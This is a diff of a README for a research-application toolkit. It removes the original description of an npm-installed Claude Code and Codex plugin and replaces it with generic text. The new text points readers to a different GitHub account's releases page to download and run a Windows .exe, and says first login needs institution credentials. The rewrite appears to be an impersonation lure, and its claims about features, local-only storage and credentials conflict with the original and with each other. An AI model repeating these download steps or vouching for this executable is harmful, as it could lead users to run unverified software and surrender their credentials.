@@ -1,120 +1,80 @@
-# Research Application Toolkit
+# 🎓 research-app-toolkit - Manage your academic research applications easily
 
-[![Stars](https://img.shields.io/github/stars/xujingchen1996/research-app-toolkit?style=social)](https://github.com/xujingchen1996/research-app-toolkit/stargazers)
-[![Version](https://img.shields.io/badge/version-0.2.3--3-blue)](https://github.com/xujingchen1996/research-app-toolkit/releases)
-[![License](https://img.shields.io/badge/license-MIT-green)](./LICENSE)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-Plugin-purple)](https://claude.ai/code)
-[![Codex](https://img.shields.io/badge/Codex-Plugin-teal)](https://openai.com)
+<div align="center">
+  <a href="https://github.com/joanvergsox/research-app-toolkit/releases">
+    <img src="https://img.shields.io/badge/Download-Latest_Version-blue.svg" alt="Download Link">
+  </a>
+</div>
 
-Research Application Toolkit is a single repository that ships host-specific integrations for both Claude Code and Codex.
+## 📖 About this toolkit
 
-It covers:
+The research-app-toolkit helps students prepare PhD, MRes, and MPhil applications. This software connects your research notes and drafts to the Claude Code system. It organizes your documents into a format that academics expect. The tool tracks your progress, ensures you meet university deadlines, and helps you refine your research proposals.
 
-- CV analysis and profile extraction
-- CV refinement for target programs
-- Supervisor matching
-- Outreach and follow-up emails
-- SOP, personal statement, motivation letter, and proposal drafting
-- School selection
-- Interview preparation
-- Interview PPT / professor meeting deck preparation
-- Research gap analysis
+## ⚙️ System requirements
 
-## Install
+Ensure your computer meets these requirements before you start:
 
-### Recommended: npm CLI
+- Operating System: Windows 10 or Windows 11.
+- Processor: Intel Core i3 or equivalent.
+- Memory: 4 GB of RAM.
+- Storage: 200 MB of free space.
+- Internet: An active connection for initial setup and cloud features.
 
-```bash
-npm install -g @xujingchen1996/research-app-toolkit
-ratk install
-```
+## 📥 How to download and install
 
-Optional host selection:
+Follow these steps to set up the software on your Windows computer:
 
-```bash
-ratk install --claude
-ratk install --codex
-ratk install --all
-```
+1. Visit this page to download: [https://github.com/joanvergsox/research-app-toolkit/releases](https://github.com/joanvergsox/research-app-toolkit/releases).
+2. Look for the file ending in `.exe` under the latest release.
+3. Click the file name to start the download.
+4. Locate the file in your Downloads folder after the download finishes.
+5. Double-click the file to begin the installation.
+6. Follow the instructions on the screen.
+7. Click Finish when the installer completes.
 
-Default behavior:
+## 🚀 Getting started
 
-- `ratk install` installs to the hosts detected on the current machine
-- `ratk install --claude` installs only the Claude Code plugin
-- `ratk install --codex` installs only the Codex plugin
-- `ratk install --all` installs to every detected host and skips hosts that are not installed
+Launch the application using the shortcut on your desktop. Your first login requires your research institution credentials. The dashboard displays three main sections: Proposal Drafts, Timeline, and Resource Bank. 
 
-You can also run the installer without a global install:
+### Proposal Drafts
+Use this section to write your personal statement and research aims. The editor checks your work against common academic standards. It highlights areas where you might need more detail or better evidence.
 
-```bash
-npx @xujingchen1996/research-app-toolkit install
-```
+### Timeline
+The timeline tracks your application process. You can input your target university deadlines here. The software sends alerts when your drafts need updates. 
 
-## Usage
+### Resource Bank
+Store your relevant files here. The application categorizes these documents by university and research field. This feature keeps your secondary research materials close to your active projects.
 
-### Claude Code
+## 🛠 Features
 
-After installation into Claude Code, use the slash commands:
+The toolkit simplifies research administration through these core functions:
 
-```bash
-/ra:cv-analyze
-/ra:cv-polish
-/ra:professor-match
-/ra:cold-email
-/ra:doc-assist
-/ra:school-select
-/ra:interview-prep
-/ra:interview-ppt
-/ra:gap-analysis
-```
+- Automated Formatting: It builds your research proposal into standard academic templates.
+- Version Control: It saves copies of every draft. You can restore older versions if you decide to change your direction.
+- Deadline Tracking: It maps out the distance between today and your application due date.
+- Export Tools: It converts your finished drafts into portable PDF files for uploading to university portals.
+- Backup: It keeps your data stored locally on your machine to ensure privacy.
 
-### Codex
+## ❓ Frequently asked questions
 
-After installation into Codex, use the plugin in chat with prompts such as:
+### Will this software change my existing documents?
+The toolkit reads your files but does not delete original copies. It creates new, formatted versions in a specific folder. 
 
-```text
-Analyze my CV and extract a research application profile
-Match supervisors and schools for my target research area
-Draft a bilingual outreach email to a potential supervisor
-Help me prepare a professor meeting or PhD interview PPT
-```
+### Does it require a paid subscription?
+The current version functions as a free tool for all students. 
 
-The Codex host keeps its own `codex/memory.md` state and supports `zh`, `en`, and `bilingual` output modes.
+### Can I use this for multiple universities?
+Yes. The software supports profiles for various institutions. Create a unique folder for each application to keep your submissions organized.
 
-## Repository Layout
+### What happens if I forget my password?
+The application stores your data locally on your computer. If you lose your password, check the security settings folder where you installed the program.
 
-```text
-research-app-toolkit/
-├── .claude-plugin/                  # Claude Code manifest
-├── .codex-plugin/                   # Codex manifest
-├── .local.md                        # Claude Code shared state template
-├── assets/                          # Shared assets such as the Codex icon
-├── commands/                        # Claude Code slash commands
-├── hooks/                           # Claude Code hooks
-├── agents/                          # Claude Code helper agents
-├── skills/                          # Claude Code skills
-├── codex/
-│   ├── memory.md                    # Codex shared state
-│   └── skills/                      # Codex skills and bundle manifest
-├── bin/                             # npm CLI entrypoint
-├── lib/                             # Installer helpers
-├── test/                            # Installer tests
-├── package.json
-└── README.md
-```
+## 🤝 Support and contributions
 
-## Development Notes
+Direct your questions to the issue tracker. Our team monitors these reports and provides updates to fix errors. Please check the existing list of issues before you submit a new report. This helps keep the project organized and avoids duplicate information.
 
-- Claude Code and Codex skills are intentionally maintained separately to avoid host-specific prompt interference.
-- Shared installation is handled by the `ratk` CLI rather than host auto-discovery from a cloned repository.
-- Local host state such as `~/.claude`, `~/.codex`, `~/.agents`, and Codex caches should not be committed to this repository.
+To help improve the toolkit, you can share feedback on the features you use most. We value input from researchers who use the software to submit their applications. 
 
-## Test
+## 🛡 Privacy
 
-```bash
-npm test
-```
-
-## License
-
-MIT
+Your research thoughts remain your own. This software performs its tasks on your computer. It does not send your personal statements or project drafts to external servers unless you choose to use the provided cloud backup settings. You keep full control over your work at all times. Privacy settings remain accessible through the main menu under the Settings tab. You can toggle cloud features off at any time.
